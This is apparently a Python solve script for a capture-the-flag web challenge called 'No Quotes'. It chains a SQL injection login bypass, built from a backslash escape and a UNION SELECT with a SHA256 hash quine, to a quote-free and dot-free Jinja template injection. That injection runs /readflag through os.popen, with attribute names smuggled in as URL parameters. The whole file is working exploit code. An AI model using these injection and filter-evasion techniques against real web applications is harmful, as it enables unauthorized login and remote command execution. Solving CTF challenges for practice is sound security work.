import requests
import binascii
import re

URL = "https://no-quotes-3-0c39ff67ea668688.chals.uoftctf.org"
URL = URL.rstrip('/')

def to_hex(s):
    return binascii.hexlify(s.encode()).decode().upper()

def solve():
    print(f"[*] Target: {URL}")

    # 1. Crafting the Dotless/Quoteless SSTI Payload
    # We retrieve keys from the URL query params (request.args).
    # 'dict(args=1)|list|min' generates the string "args".
    # We cast request['args'] to a list to get specific keys by index.
    # The chain builds: request['application']['__globals__']...
    
    ssti_payload = (
        "{%set k=request[dict(args=1)|list|min]|list%}"
        "{{request[k[0]][k[1]][k[2]][k[3]](k[4])[k[5]](k[7])[k[6]]()}}"
    )
    
    # 2. Username: Backslash Trick to inject into password
    username_val = ssti_payload + "\\"
    username_hex = to_hex(username_val)

    # 3. Password: SHA256 Hash Quine
    # The DB must return the SHA256 hash of the payload to pass the Python check.
    template = f") UNION SELECT 0x{username_hex}, SHA2(REPLACE(0x?, 0x3F, HEX(0x?)), 256) #"
    template_hex = to_hex(template)
    password_val = template.replace("?", template_hex)
    
    data = {
        "username": username_val,
        "password": password_val
    }
    
    # 4. Smuggling Payload Components via URL Parameters
    # These keys map to k[0], k[1], etc. in the payload.
    # Order is crucial.
    ssti_params = {
        "application": "",  # k[0]
        "__globals__": "",  # k[1]
        "__builtins__": "", # k[2]
        "__import__": "",   # k[3]
        "os": "",           # k[4]
        "popen": "",        # k[5]
        "read": "",         # k[6]
        "/readflag": ""     # k[7]
    }

    print(f"[*] Sending Hash Quine payload...")

    try:
        s = requests.Session()
        
        # Step 1: Login via POST (Injects payload into session)
        r = s.post(f"{URL}/login", data=data)
        
        # Step 2: Trigger SSTI on /home via GET
        # We MUST send the params here so the template can find the keys.
        print("[*] Triggering SSTI on /home...")
        r_home = s.get(f"{URL}/home", params=ssti_params)
        content = r_home.text

        flag = re.search(r"uoftctf\{.*?\}", content)
        
        if flag:
            print(f"\n[+] FLAG FOUND: {flag.group(0)}\n")
        else:
            if "Invalid credentials" in r.text:
                print("[-] Error: Hash mismatch or SQL error.")
            elif "No quotes" in r.text:
                print("[-] Error: WAF blocked the request.")
            else:
                print("[-] Flag not found.")

    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    solve()